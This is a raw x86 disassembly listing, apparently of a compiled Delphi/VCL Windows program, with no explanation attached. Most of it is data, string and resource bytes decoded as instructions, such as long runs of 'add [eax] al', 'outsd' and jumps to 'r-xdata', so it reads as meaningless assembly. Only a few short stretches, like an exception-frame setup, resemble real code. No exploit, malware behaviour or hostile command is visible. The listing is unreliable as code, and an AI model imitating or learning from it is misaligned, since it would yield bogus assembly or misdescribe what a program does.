add [ eax - 0x5a ] ch
inc edi
add [ ecx - 0x1 ] bl
add [ eax ] al
push 0x5a0047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebx - 0x1 ] bl
add [ eax ] al
push 0x5c0047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebp - 0x1 ] bl
add [ eax ] al
push 0x5e0047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi - 0x1 ] bl
add [ eax ] al
push 0x400047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ecx - 0x1 ] al
add [ eax ] al
push 0x420047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebx - 0x1 ] al
add [ eax ] al
push 0x440047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebp - 0x1 ] al
add [ eax ] al
push 0x460047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi - 0x1 ] al
add [ eax ] al
push 0x480047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ecx - 0x1 ] cl
add [ eax ] al
push 0x4a0047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebx - 0x1 ] cl
add [ eax ] al
push 0x4c0047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebp - 0x1 ] cl
add [ eax ] al
push 0x4e0047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi - 0x1 ] cl
add [ eax ] al
push 0x300047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ecx ] dh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edx ] dh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebx ] dh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi + edi * 8 ] dh
add [ eax ] al
push 0x350047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ esi ] dh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi ] dh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ eax ] bh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ecx ] bh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edx ] bh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebx ] bh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi + edi * 8 ] bh
add [ eax ] al
push 0x3d0047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ esi ] bh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi ] bh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ eax ] ah
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ecx ] ah
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edx ] ah
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebx ] ah
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi + edi * 8 ] ah
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_421209
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421210
retn
sub_421220
add [ esi ] eax
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
adc [ edx ] 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004212 ] al
add [ eax ] al
add ah ch
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
adc al [ edx ]
or al 0x0
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ eax ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
popad
jo r-xdata
add [ eax ] al
in al dx
jb r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl sp bx
adc al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcom [ edx ]
inc edx
add [ eax + eax ] cl
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add al bh
adc al [ edx ]
or [ esi + 0x70 ] esp
inc esp
popa
jne r-xdata
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
push esp
imul esp [ ebx + 0x4f ] 0x61726570
jb r-xdata
push 0x65737261
je r-xdata
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
jae r-xdata
inc esi
popad
insd
nop
push eax
adc eax [ edx ]
add [ esp + edx * 2 ] ecx
je r-xdata
je r-xdata
outsb
je r-xdata
outsd
outsb
lea eax [ eax ]
cld
adc al [ edx ]
add ecx [ edx ]
push esp
inc esi
outsd
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
insb
adc eax [ edx ]
push es
jo r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
jae r-xdata
jb r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
push 0x6004213
popad
jb r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ eax ] bh
adc al 0x42
add [ edi ] al
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
adc eax [ edx ]
mov eax eax
aam 0x13
inc edx
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
push 0x8b004213
rcl ah 0x13
push ebx
jae r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x13 ] ch
inc edx
add [ esi ] al
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x42134090
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
outsd
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0x13bcc08b
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add al dl
adc eax [ edx ]
pop es
jo r-xdata
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
jo r-xdata
push es
pop es
jb r-xdata
insd
push edi
push 0x5657469
jo r-xdata
jo r-xdata
pop es
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
in al 0x15
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
adc eax 0x15d00042
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x42143c90
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
inc edx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
sar al 0x14
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
jo r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
add eax 0x6f4e6d70
add [ ecx ] al
add ch bh
jae r-xdata
add [ ebx ] al
mov eax eax
clc
adc al 0x42
inc edi
jb r-xdata
jb r-xdata
inc ebx
outsd
jo r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
pop eax
dec esi
inc esp
outsd
push 0x65
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add ah dh
adc al 0x42
add [ edi ] al
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
dec esi
inc ecx
or eax 0x654d6d70
jb r-xdata
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
dec ebp
push eax
outsb
insb
add [ eax ] eax
arpl [ esp + 0x15 ] si
inc edx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0x656a624f
sub al [ edx ]
andps xmm0 [ edi + 0x72 ]
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
inc edx
imul esp [ ebx + 0x73 ] 0x14f8c08b
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
mov al 0xa7
inc ecx
add al al
test al 0x41
add al cl
test al 0x41
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc edx
add [ eax ] bl
add [ eax ] al
add al ah
jg r-xdata
jpe r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
rcl [ esi ] 0x42
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + edi * 4 + 0x15 ] si
inc edx
add [ eax + eax * 4 + 0x41 ] dl
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
inc eax
add [ eax ] al
xor al [ eax ]
aam 0x2d
inc edx
add al al
test al 0x41
imul sp [ ebp + 0x72 ] 0x11a4
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
jae r-xdata
dec ebp
popad
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
adc eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4215 0x0
rcl [ 0x180042 ] 0x1
nop
inc edi
outsd
popad
insb
dec esi
outsd
je r-xdata
outsb
je r-xdata
add al cl
test al 0x41
add [ eax ] bl
inc edx
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add ah dl
sub eax 0xa8c00042
inc ecx
inc edx
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc edx
add [ eax + eax ] ah
add [ eax ] al
jo r-xdata
mov dh 0x16
jo r-xdata
dec ebp
jb r-xdata
outsb
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi + edx ] cl
jo r-xdata
jb r-xdata
mov esp 0x4215
inc esp
jo r-xdata
add [ eax ] al
loopne r-xdata
add al dl
adc eax 0x180042
insb
adc eax 0x34940042
inc eax
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
outsd
je r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
adc [ esi ] dl
inc edx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
dec esi
outsd
or dh [ gs : eax + 0x6d ]
inc edx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
add [ eax ] al
or al 0x16
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x49ffbdea ] ch
push ss
imul esp [ ebx + 0x73 ] 0xffff0001
nop
nop
push ss
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx + 0x16c00042 ] bl
inc edx
popad
jo r-xdata
add [ eax ] al
imul esp [ ebx + 0x73 ] 0x4215bc90
sub_421809
xor al [ edx ]
shr [ eax - 0x5737ffbf ] 0x41
add [ eax ] bl
xor eax [ edx ]
add al 0x54
push eax
outsb
lea eax [ eax ]
and al 0x18
inc edx
add [ edi ] al
add al 0x54
push eax
outsb
or al 0x18
inc edx
add al ah
adc eax 0x40042
or [ edi + 0x72 ] al
popad
jo r-xdata
inc esp
xor eax 0x354c0042
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0x190cc08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
sbb [ edx ] eax
sbb [ eax ] al
add [ eax ] al
jo r-xdata
imul esp [ ebx + 0x73 ] 0x121c0004
inc edx
add [ eax ] bh
xor al 0x42
add [ eax + 0x34 ] al
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax - 0x3fffbdcb ] bh
test al 0x41
add al cl
test al 0x41
add al ah
xor eax 0x54060042
inc edx
jb r-xdata
inc edx
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
mov eax 0xc0004235
add eax 0x6c797453
push esp
adc [ eax ] al
adc al 0x42
add [ eax ] bl
add [ eax ] al
inc [ eax ]
xor eax 0x10042
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
add [ eax ] eax
add al 0x4d
outsd
rcl [ gs : ebx ] 0x1
inc edx
add [ esi + 0x351c0042 ] dl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add [ eax ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
sbb [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
and al 0x19
inc edx
add [ edi ] al
push es
push esp
inc edx
jb r-xdata
hlt
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
xor al 0x39
add [ eax ] al
add al ah
jg r-xdata
add [ eax ] al
add [ eax ] al
add al ch
sbb [ edx ] eax
pop eax
jae r-xdata
jns r-xdata
jae r-xdata
hlt
or al 0x19
inc edx
add al ah
adc eax 0x20042
or [ edi + 0x72 ] al
popad
jo r-xdata
add al 0x24
outsd
mov esp 0xc004216
add [ eax ] al
dec [ eax + 0x100423d ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
inc edx
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
sbb [ edx ] eax
pop es
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
call 0x58425bc2
imul esp [ ebx + 0x73 ] 0x121c0002
inc edx
add [ eax ] bl
aaa
inc edx
add [ eax ] ah
aaa
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
retn
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax + 0x54 ]
xchg [ esp ] eax
sbb [ edx ] al
adc [ eax ] al
add bh bh
cwde
cmp eax 0x10042
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add edx [ eax + 0x65 ]
outsb
mov eax eax
int3
outsd
outsb
je r-xdata
mov [ 0x10042 ] bh
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
jae r-xdata
adc al 0x42
add [ eax + edi ] dh
inc edx
add [ eax + edi ] bh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
rcr [ ecx ] 0x1
inc edx
inc edx
add al al
test al 0x41
add al cl
test al 0x41
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add ah al
aas
inc edx
add [ eax - 0x1bffbdc1 ] dh
sbb [ edx ] eax
push esp
add [ ecx ] 0x4
add [ eax ] cl
inc edi
jb r-xdata
add al 0x46
add [ edx ] 0x0
jo r-xdata
imul esp [ ebx + 0x73 ] 0x19200004
inc edx
add [ eax + eax ] dl
add bh bh
movsb [ edi ] [ esi ]
cmp eax 0x10042
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add eax 0x73757242
push r-xdata
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
add al 0xdc
jmp r-xdata
dec ebp
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_421bbe
inc edx
add [ eax ] cl
push esp
inc edi
jb r-xdata
add [ edx + eax * 2 ] ebx
add [ edi ] cl
sbb al 0x42
add [ ecx ] bl
jo r-xdata
sbb al 0x42
add cl dh
sbb eax [ edx ]
stc
sbb eax [ edx ]
add [ eax ] eax
add [ eax ] al
mov [ 0x7ab8cd12 ] eax
aam 0x11
imul esp [ ebx - 0x73 ] 0x1bd00040
inc edx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
int 0xb8
jpe r-xdata
imul esp [ ebx + 0x54 ] 0x5400421b
add [ ecx ] 0x47080000
jb r-xdata
sbb al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl cl
sbb al 0x42
add al bl
sbb al 0x42
add [ eax + eax ] ch
add [ eax ] al
rol [ eax + 0x34940041 ] 0x1
inc eax
add [ eax - 0x5bffbe57 ] al
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax + 0x5c ] bl
inc edx
add [ eax + 0x400425c ] cl
popad
inc edx
add [ eax + 0x5e ] cl
inc edx
add [ eax ] dl
stosb [ edi ]
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi + edx ] cl
inc edx
add [ eax ] bl
add [ eax ] al
add [ edx ] al
add ch bh
inc edx
add al ch
sbb edx 0x0
aam 0x11
ror [ edi + 0x60 ] 0xb2
frstor [ esi ]
sbb al 0x42
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x421ca8c0 ] cl
jo r-xdata
add [ edx ] bh
sbb al 0x42
add [ eax ] al
add [ eax ] al
add [ eax - 0x17ffbde4 ] bh
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
test al 0x1c
inc edx
imul esp [ ebx + 0x73 ] 0xcc900000
add eax 0xffffffd8
jmp sub_425e18
sub_421cce
cld
dec eax
pop esi
inc edx
add ah ch
pop esi
inc edx
add [ eax ] cl
push esp
push eax
imul esp [ ebx + 0x74 ] 0x8d657275
inc eax
add al ch
sbb al 0x42
add [ edi ] al
or [ eax + edx * 2 + 0x69 ] dl
arpl [ ebp + esi * 2 + 0x72 ] si
test al 0x1c
inc edx
add [ ecx + eax * 4 + 0x41 ] dl
add [ eax ] al
add [ eax ] cl
aas
inc edx
add [ eax - 0x1bffbdc1 ] dh
inc edx
jo r-xdata
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
imul bp [ ebp + 0x43 ] 0x6e61
jbe r-xdata
add [ edi ] cl
push esp
dec ebp
je r-xdata
inc edx
imul esp [ ebx + 0x73 ] 0x54900000
sbb eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ 0x42 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebx + 0x42 ] ch
add [ eax + eax ] bl
add [ ecx + ebx + 0x34940042 ] al
inc eax
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax - 0x3fffbd9c ] ch
test al 0x41
add al cl
test al 0x41
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add ah al
add [ eax ] dl
stosb [ edi ]
inc ecx
add [ eax ] bl
push esp
inc edx
add [ eax ] al
inc dx
add ah dl
push esp
inc edx
add [ eax + 0x67 ] bh
inc edx
add [ eax + 0x24004267 ] dl
push 0x56200042
inc edx
add [ eax - 0x6fffbd98 ] dh
imul eax [ edx ] sub_426dbc
add al 0x57
inc edx
add [ eax - 0x53ffbd92 ] ch
outsb
inc edx
add [ eax + esi * 2 ] al
inc edx
add ah dh
inc edx
add [ esi + edx * 2 ] ah
inc edx
add [ esp + ebp * 2 + 0x42 ] cl
add [ ecx + ebp * 2 ] dl
inc edx
add [ eax ] dl
insd
inc edx
add [ eax + 0x72 ] bl
inc edx
add ah bl
jb r-xdata
imul bp [ ebp + 0x49 ] 0x616d
nop
mov ah 0x1e
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
pop ds
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
pop ds
inc edx
add [ eax ] dh
add [ eax ] al
add [ eax ] cl
sbb eax [ edx ]
xchg esp eax
xor al 0x40
add [ eax - 0x5bffbe57 ] al
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ 0xffffffffa8c00042 ] bh
inc ecx
add [ eax + 0x6c004254 ] cl
inc edx
inc eax
add [ edx + ebp + 0x40 ] al
add [ esp + edx * 2 ] cl
movsb [ edi ] [ esi ]
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7400421f ] bl
add [ eax ] al
add [ eax - 0x6bffbde3 ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ ecx ] cl
push esp
dec ebp
je r-xdata
inc edi
jb r-xdata
sbb eax 0xf070042
push esp
dec ebp
je r-xdata
xor al 0x40
add [ eax - 0x5bffbe57 ] al
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add ah dh
add [ edx ] sub_41a8c0
mov [ edx + eax * 2 ] dl
xor [ edx - 0x55efffbe ] al
inc ecx
add [ esp + eax * 4 ] al
inc edx
add [ esp + eax * 4 + 0x54d40042 ] al
inc edx
add [ eax ] bh
xchg [ edx ] eax
in al dx
xchg [ edx ] eax
sub al 0x88
inc edx
add [ eax ] ah
push esi
inc edx
add [ eax + 0x74004288 ] cl
mov [ edx ] es
jo r-xdata
add [ edi + esi * 2 + 0x42 ] ah
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
hlt
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax ] cl
ja r-xdata
imul bp [ ebp - 0x75 ] 0x28c0
pop ds
inc edx
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
in al 0x31
imul bp [ ebp + 0x43 ] 0x6e61
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ fs : edx ] al
cmp al 0x0
inc edx
add [ ebp + edx * 4 + 0x42 ] al
add [ eax ] cl
push edi
inc edx
add [ eax ] bl
xchg esi eax
inc edx
add [ esi + edx * 4 + 0x42 ] ch
add [ ecx + eax * 4 + 0x56240042 ] cl
inc edx
add [ esi + edx * 2 - 0x74afffbe ] ch
inc edx
add [ ecx + ebx * 4 - 0x7533ffbe ] al
inc edx
add [ ecx + ebx * 4 - 0x7863ffbe ] cl
inc edx
add ah bh
xchg [ edx ] eax
cmp [ ebx + 0x54070042 ] dl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x42207070
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x421ff470
add ah cl
sbb eax [ edx ]
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
or [ edi + 0x42 ] dh
imul bp [ ebp - 0x4c ] 0x421e
add ah cl
sbb eax [ edx ]
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
push ebx
push 0x64657261
dec ecx
insd
popad
lea eax [ bx + si ]
push esp
xor al [ eax ]
inc esp
sub al [ eax ]
or al 0x54
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4221 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x340042 ] bl
add [ eax ] al
or [ ebx ] bl
inc edx
add [ esp + esi - 0x567fffc0 ] dl
inc ecx
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
enter 0x429a 0x0
shr [ eax + 0x54880041 ] 0x42
add al bh
0xaa100042 0x41
sbb [ edx + eax * 2 ] dl
pop eax
fwait
inc edx
add ah dl
push esp
inc edx
add [ eax - 0x3bffbd65 ] bl
fwait
inc edx
add [ esi + edx * 2 ] bl
inc edx
add [ eax ] ah
push esi
inc edx
add al bl
fwait
inc edx
add [ eax + 0x5c004256 ] ah
sahf
inc edx
add [ edi + edx * 2 ] al
inc edx
add [ esi + ebx * 4 + 0x42 ] dh
add [ eax - 0x62 ] bh
inc edx
add [ eax ] bl
push edi
inc edx
